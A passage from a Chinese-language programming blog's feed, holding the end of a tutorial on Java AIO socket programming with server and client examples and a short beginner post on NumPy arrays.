Completion Port）</code>来实现的，Linux中则是<code>epoll</code>。<strong>AIO本质上是一种异步的机制。</strong></p><p>那么AIO和BIO的区别在哪里呢？其实很好理解，在上一节NIO代码可以看出，<strong>操作系统通知我们的时刻，是该IO就绪的时刻，即可读或可写</strong>，在此之前我们是阻塞的。回顾一下select的图：</p><figure><img src="/img/Java网络编程模型Review/IO多路复用.jpg"alt="IO多路复用" /><figcaption aria-hidden="true">IO多路复用</figcaption></figure><p>而对于真正的异步，我们是不需要主动等待的，而是立即返回，并由操作系统通知我们。<strong>对于AIO，操作系统通知我们的时刻，是该IO已经完成的时刻，即读完了，写完了</strong>。回顾一下异步的图。</p><figure><img src="/img/Java网络编程模型Review/异步.jpg" alt="异步" /><figcaption aria-hidden="true">异步</figcaption></figure><h3 id="使用方法-1">使用方法</h3><p>我们以TCP为例。Java中主要使用<code>java.nio.*</code>下的类来实现，常用的类如：<code>java.nio.channels.AsynchronousSocketChannel</code>、<code>java.nio.channels.AsynchronousServerSocketChannel</code>、<code>java.nio.channels.CompletionHandler</code>。至于UDP，将上面的<code>AsynchronousSocketChannel</code>和改为使用<code>AsynchronousDatagramChanel</code>即可，他们的关系如下：</p><figure><img src="/img/Java网络编程模型Review/AIO常用类关系图.png"alt="AIO常用类关系图" /><figcaption aria-hidden="true">AIO常用类关系图</figcaption></figure><p>注意到，在<code>AsynchronoutSocketChannel</code>中，<code>accept</code>、<code>connect</code>、<code>read</code>和<code>write</code>方法有都提供了使用<code>CompletionHandler&lt;Integer, A&gt;</code>的<strong>回调机制</strong>，这也是体现异步的地方，这四个函数的调用会立即返回，不会阻塞，且将这四个函数的<strong>具体执行交给JVM默认线程池的某个线程在后台执行，当操作完成后，该线程会再执行传入的回调函数来通知我们</strong>。</p><p>这样的回调机制和方法声明，在NIO中是没有的，也是最主要的一个区别。我们可以看一下这个关键的<code>java.nio.channels.CompletionHandler</code>是怎么定义的：</p><figure><img src="/img/Java网络编程模型Review/image-20230106144042454.png"alt="CompletionHandler接口定义" /><figcaption aria-hidden="true">CompletionHandler接口定义</figcaption></figure><p>可以看到，该接口声明了两个方法分别对应IO操作<strong>成功</strong>和<strong>失败</strong>两种情况，并传入IO操作的结果或异常至我们的回调函数中进行进一步的处理。</p><h4 id="服务端-1">服务端</h4><p>下面我们就看一下使用AIO如何编写服务端和客户端。大体来说，与BIO编写方式类似，但是我们可以通过回调的方式实现异步操作。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.AsynchronousServerSocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.AsynchronousSocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.CompletionHandler;</span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/06</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AIOTCPServer</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 异步监听socket，在静态代码块中初始化</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">AsynchronousServerSocketChannel</span> <span class="variable">serverSocketChannel</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            serverSocketChannel = AsynchronousServerSocketChannel.open();</span><br><span class="line">            serverSocketChannel.bind(<span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="number">6666</span>));</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.err.println(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 读取数据的回调函数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> CompletionHandler&lt;Integer, ByteBuffer&gt; READ_HANDLER = <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Integer, ByteBuffer&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Integer result, ByteBuffer readResultBuffer)</span> &#123;</span><br><span class="line">            <span class="comment">// 数据读取完成（这里注意，不需要我们去read操作，操作系统已经帮我们把数据拷贝到用户空间了，即readResultBuffer变量中</span></span><br><span class="line">            readResultBuffer.flip();</span><br><span class="line">            <span class="type">String</span> <span class="variable">rawData</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(readResultBuffer.array()).trim();</span><br><span class="line">            System.out.println(LocalDateTime.now() + <span class="string">&quot; - &quot;</span> + Thread.currentThread().getName() +</span><br><span class="line">                    <span class="string">&quot; - ## 接收数据：&quot;</span> + rawData + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, ByteBuffer attachment)</span> &#123;</span><br><span class="line">            exc.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 接收请求的回调函数</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> CompletionHandler&lt;AsynchronousSocketChannel, Void&gt; ACCEPT_HANDLER =</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;AsynchronousSocketChannel, Void&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(AsynchronousSocketChannel channel, Void obj)</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        System.out.println(LocalDateTime.now() + <span class="string">&quot; - &quot;</span> +  Thread.currentThread().getName() +</span><br><span class="line">                                <span class="string">&quot; - ## 客户端连接成功：&quot;</span> + channel.getRemoteAddress() + <span class="string">&quot; ##&quot;</span>);</span><br><span class="line">                        <span class="comment">// 异步读取数据，立即返回不阻塞</span></span><br><span class="line">                        <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">100</span>);</span><br><span class="line">                        channel.read(buffer, buffer, READ_HANDLER);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 再次接受其他的客户端链接</span></span><br><span class="line">                        serverSocketChannel.accept(<span class="literal">null</span>, <span class="built_in">this</span>);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, Void obj)</span> &#123;</span><br><span class="line">                    System.err.println(<span class="string">&quot;连接客户端失败！err: &quot;</span> + exc);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;端口绑定完成，等待连接......&quot;</span>);</span><br><span class="line">        <span class="comment">// 等待连接，立即返回，不阻塞</span></span><br><span class="line">        serverSocketChannel.accept(<span class="literal">null</span>, ACCEPT_HANDLER);</span><br><span class="line">        <span class="comment">// 验证异步</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Thread.sleep(<span class="number">500</span>);</span><br><span class="line">                System.out.println(Thread.currentThread().getName() + <span class="string">&quot;闲的一匹&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在上面的代码中，static静态代码块以及main函数处我们写了简单的逻辑，即初始化socket、绑定端口等等。</p><p>需要注意的是，从<code>accept</code>函数开始我们的使用方法就有区别了。在开头我定义了两个常量（ps：实际开发肯定不这么干，肯定是写类）<code>READ_HANDLER</code>和<code>ACCEPT_HANDLER</code>，一个是<strong>接收到连接</strong>时的回调函数，另一个是<strong>读取数据完成时</strong>的回调函数。二者均实现了前面提到的<code>CompletionHandler</code>接口，分别定义了complete和failed函数的内容。</p><p>而这两个回调函数也正是我们实现异步操作的核心了，当JVM后台线程池accept、read操作后，就会对应地、执行我们的回调函数。这就对应了我们前面理论部分中提到的：<strong>操作完成时（如accept完成、读取完成、写入完成等）由操作系统通知我们，而不是我们主动阻塞等待。</strong></p><h4 id="客户端-1">客户端</h4><p>对应的实现客户端代码如下。同上，我们需要定义一个<code>connect</code>函数的回调函数。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetSocketAddress;</span><br><span class="line"><span class="keyword">import</span> java.nio.ByteBuffer;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.AsynchronousSocketChannel;</span><br><span class="line"><span class="keyword">import</span> java.nio.channels.CompletionHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.CountDownLatch;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> lzwgiter</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2023/01/06</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AIOTCPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">AsynchronousSocketChannel</span> <span class="variable">socketChannel</span> <span class="operator">=</span> AsynchronousSocketChannel.open()) &#123;</span><br><span class="line">            <span class="type">InetSocketAddress</span> <span class="variable">remote</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InetSocketAddress</span>(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">6666</span>);</span><br><span class="line">            <span class="comment">// 用于计数，避免客户端退出</span></span><br><span class="line">            <span class="type">CountDownLatch</span> <span class="variable">end</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CountDownLatch</span>(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="type">ByteBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> ByteBuffer.allocate(<span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">            socketChannel.connect(remote, buffer, <span class="keyword">new</span> <span class="title class_">CompletionHandler</span>&lt;Void, ByteBuffer&gt;() &#123;</span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">completed</span><span class="params">(Void result, ByteBuffer channel)</span> &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        System.out.println(<span class="string">&quot;客户端连接成功&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;this is a simple test.&quot;</span>;</span><br><span class="line">                        channel.put(msg.getBytes());</span><br><span class="line">                        channel.flip();</span><br><span class="line">                        socketChannel.write(channel);</span><br><span class="line">                        System.out.println(<span class="string">&quot;发送数据: &quot;</span> + msg);</span><br><span class="line">                        socketChannel.close();</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                    &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                        end.countDown();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="meta">@Override</span></span><br><span class="line">                <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">failed</span><span class="params">(Throwable exc, ByteBuffer attachment)</span> &#123;</span><br><span class="line">                    exc.printStackTrace();</span><br><span class="line">                    end.countDown();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 等待直到连接关闭</span></span><br><span class="line">            end.await();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | InterruptedException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="运行结果-3">运行结果</h3><p>运行结果有几个意思的点，结合理论，重点强调一下加深印象。</p><figure><img src="/img/Java网络编程模型Review/image-20230107012042473.png"alt="AIO运行结果" /><figcaption aria-hidden="true">AIO运行结果</figcaption></figure><ul><li><p>可以看到，能打印出<code>闲的一批</code>就已经说明<code>accept</code>不阻塞了，并没有"卡"在accpet那里使得main线程挂起。</p></li><li><p>观察一下，在<code>accept</code>和<code>read</code>操作的回调函数中，是谁在执行操作？从图中可以看到<code>Thread-x</code>的名字。那就说明，是从属于JVM默认线程池中的线程来做的，这和理论保持一致。</p></li></ul><h2 id="小结">小结</h2><p>看完基本的三种IO模型后，一个很自然而然的问题就是，我们应当在什么场景下使用呢？</p><ul><li>BIO：BIO方式适用于连接数量少且固定的场景，这种方式对服务器资源要求比较高，JDK1.4之前唯一的选择，程序直观简单易理解。</li><li>NIO：适用于连接数目多且业务比较轻。JDK1.4开始支持。</li><li>AIO：适用于连接数目多且连接比较长(业务重操作)，需要操作系统充分参与并发操作。JDK1.7开始支持。</li></ul><p>如果说你的服务器资源充足、且客户端数量少，那BIO就可以了，这是足够且最简单的方法。</p><p>而如果连接数比较多了，比如10万个连接，就算是多线程+BIO也没法处理（线程切换开销、线程池资源有限）。这时候就可以考虑使用利用<code>selector</code>机制的NIO。值得一提的是，你如果自己用JDK原生的NIO类去写代码，说实话蛮麻烦的，我前面那个都是小儿科了，正儿八经的需要熟悉<strong>Reactor模式</strong>（单一线程监听连接、多线程处理不同连接），如select后的包装成FutureTask扔给线程池，那你还得懂多线程编程、并发注意事项等等。</p><p><strong>Netty是一个封装了JavaNIO的API的框架，比如Hadoop的RPC框架就是基于Netty实现的，</strong>直接用Netty去实现NIO相较于你自己从头搞要好很多（当然，了解原理是很重要的）。而AIO，当你需要异步需求的时候可以使用。</p><h1 id="总结">总结</h1><p>总结一下，本篇复习了以下内容：</p><ul><li>关于Socket</li><li>Java中如何使用基本的socket实现基本同步阻塞的TCP、UDP编程</li><li>Java中的三种IO模型(BIO、NIO、AIO)、使用方法及其应用场景。</li></ul><h1 id="参考文献">参考文献</h1><ul><li>《网络编程使用教程（第2版）》——叶树华</li><li>《操作系统概念》——亚伯拉罕·西尔伯沙茨</li><li>《Java核心技术 卷I 开发基础（第12版）》——凯·S.霍斯特曼</li><li>《Java网络编程进阶——从BIO到RPC》——肖川</li><li><ahref="https://www.cnblogs.com/binbingg/p/15208296.html#scroller-10">【转】Java网络编程模型- Binge-和时间做朋友 - 博客园 (cnblogs.com)</a>****</li></ul><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;失踪人口回归...，2022年几乎没怎么好好写博客，一方面原因是因为科研，另一方面...懒了懒了我错了。年底中招奥密克戎，最近也是才缓过劲来，真是坎坷的一年。本科之前其实接触过C语言的网络编程，带课的李金库老师讲的很好，记得当时特别地对I/O多路复用(select)留下了&lt;a
href=&quot;https://github.com/lzwgiter/MyCWebStudy&quot;&gt;很深的印象&lt;/a&gt;。今天复习一下Java中网络编程的相关理论和代码，包括最基础的Sokcet使用以及三种I/O模型。（ps：&lt;strong&gt;我gitee的博客由于部分文章没法过审核，因此gitee博客以后可能就不会更新了，我仍然使用github博客为主。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/img/Java网络编程模型Review/db04ec35da1f9962545649576098426a.jpeg&quot; alt=&quot;db04ec35da1f9962545649576098426a&quot; style=&quot;zoom:67%;&quot; /&gt;&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="Java" scheme="https://lzwgiter.github.io/tags/Java/"/>
    
    <category term="网络编程" scheme="https://lzwgiter.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>python-Numpy库使用</title>
    <link href="https://lzwgiter.github.io/posts/203767b8.html"/>
    <id>https://lzwgiter.github.io/posts/203767b8.html</id>
    <published>2022-04-26T12:07:51.000Z</published>
    <updated>2023-01-02T07:21:40.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>学习一下Numpy库的使用，该库在机器学习领域有不小的用处，可以高效的进行向量、矩阵等之间的运算操作。最近在学习强化学习的部分，代码实现刚好有用到。</p></blockquote><span id="more"></span><h1 id="基础部分">基础部分</h1><h2 id="安装">安装</h2><p>安装非常简单，使用pip命令就可以了：</p><blockquote><p>pip install numpy</p></blockquote><h2 id="简单使用和基本概念">简单使用和基本概念</h2><p>Numpy中主要的对象都是<strong>同构(homogeneous)</strong>的<strong>多维(multidimensional)</strong>数组，可以理解为一个如下的表格：<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">| 序号  | 年龄  |  成绩  |</span><br><span class="line">|  1   |  18   |  100  |</span><br><span class="line">|  2   |  20   |  98   |</span><br></pre></td></tr></table></figure></p><p>除去表头外，可以看到数据都是同质的，即这里都是<strong>数字</strong>(通常为number)。上述的数据我们可以用一个多维列表表示：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[[<span class="number">1.</span>, <span class="number">18.</span>, <span class="number">100.</span>],</span><br><span class="line"> [<span class="number">2.</span>, <span class="number">20.</span>, <span class="number">98.</span>]]</span><br></pre></td></tr></table></figure><p>Numpy中通常将维度<code>dimension</code>称为<code>axis</code>(n.轴，轴线)，如上面这个数据，他的轴(维度)就是2，及两个axes，其中每一个axis长度为3。像上面这种<code>array</code>在Numpy中就叫<code>ndarray</code>，这和python自带的那个<code>array.array</code>是不一样的，后者只是一维的。官网描述如下：</p><blockquote><p>In NumPy dimensions are called axes.</p></blockquote><p>即维度称作<strong>轴</strong>，最简单的理解方式就是，我们学过的一维坐标系、二维坐标系、三维坐标系，这里的维实际上就是轴，你问我什么轴？那就是x、y、z了。所以我们也可以说一维坐标系就只有一个轴，二维有两个轴。</p><p>下面我们用命令行创建一个<code>ndarray</code>的对象：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo = np.arange(<span class="number">15</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(demo)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;numpy.ndarray&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo</span><br><span class="line">array([ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>])</span><br></pre></td></tr></table></figure><p>上面的<code>arange</code>函数用来生成指定范围内，指定step的均匀的数据。通该函数我们就得到了一个<code>numpy.ndarray</code>的对象，函数定义：</p><blockquote><p>arange(...) arange([start,] stop[, step,], dtype=None, *,like=None)</p><p>​ Return evenly spaced values within a given interval.</p></blockquote><p>我们使用<code>reshap</code>函数将他变为一个指定行和列的向量组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.reshape(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>,  <span class="number">4</span>],</span><br><span class="line">       [ <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>],</span><br><span class="line">       [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>]])</span><br></pre></td></tr></table></figure><p><code>reshape</code>函数实现修改向量的维度，这样我们就将数据修改为了二维的了，他有两个轴，长度分别为3和5（不理解这两个数字可以往下看）。定义如下：</p><blockquote><p>reshape(a, newshape, order='C') Gives a new shape to an array withoutchanging its data.</p></blockquote><p>对于一个<code>ndarray</code>对象，几个比较关键的属性如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ndim 数组的维度数量，也叫做轴axis的数量</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.ndim **注意下这里**</span><br><span class="line"><span class="number">2</span></span><br><span class="line"><span class="comment"># shape 数组的维度，等价于各个轴的长度，等价于秩的值</span></span><br><span class="line"><span class="comment"># 第一位代表轴0的长度，第二位代表轴1的长度，第三位代表轴3的长度</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.shape</span><br><span class="line">(<span class="number">3</span>, <span class="number">5</span>)</span><br><span class="line"><span class="comment"># size 包含元素总数</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.size</span><br><span class="line"><span class="number">15</span></span><br><span class="line"><span class="comment"># itemsize 元素大小</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.itemsize</span><br><span class="line"><span class="number">4</span></span><br><span class="line"><span class="comment"># dtype 数据类型，既可以为Python标准类型，也可以是numpy.int32、numpy.int16、numpy.float64</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.dtype</span><br><span class="line">dtype(<span class="string">&#x27;int32&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>demo.dtype.name</span><br><span class="line"><span class="string">&#x27;int32&#x27;</span></span><br></pre></td></tr></table></figure><p>读到这里你可能会和我一样疑惑（没有最好...），哎，<code>demo</code>不是一个3×5的向量组吗？为什么维度是2？为什么不是3？不是5？请把这个3×5的向量组理解为一个3×5的表格，那么这个表格是几维的呢？或者说几个轴呢？答案显然是2了，且两个轴的长度分别为3和5。如果还不能充分理解，请看<ahref="https://blog.csdn.net/Babyfatliang/article/details/87721282">下图</a>：</p><p><img src="/img/python-Numpy库使用/image-20220426205627110.png" /></p><h1 id="参考学习">参考学习</h1><p><ahref="https://numpy.org/doc/stable/user/absolute_beginners.html">NumPy:the absolute basics for beginners — NumPy v1.22 Manual</a></p><p><ahref="https://blog.csdn.net/Babyfatliang/article/details/87721282">【Python模块学习】NumPy中的维度(dimension)、轴(axis)、秩(rank)的含义_Babyfatliang的博客-CSDN博客_python维度</a></p><p><img src="/img/请我喝杯咖啡吧.jpg" style="zoom:33%;" /></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;学习一下Numpy库的使用，该库在机器学习领域有不小的用处，可以高效的进行向量、矩阵等之间的运算操作。最近在学习强化学习的部分，代码实现刚好有用到。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    <category term="开发技术" scheme="https://lzwgiter.github.io/categories/%E5%BC%80%E5%8F%91%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="python" scheme="https://lzwgiter.github.io/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>MATLAB - Wireless Communication Onramp</title>
    <link href="https://lzwgiter.github.io/posts/f06096b.html"/>
    <id>https://lzwgiter.github.io/posts/f06096b.html</id>
    <published>2022-01-20T10:08:41.000Z</published>
    <updated>2023-01-02T07:18:20.000Z</updated>
    
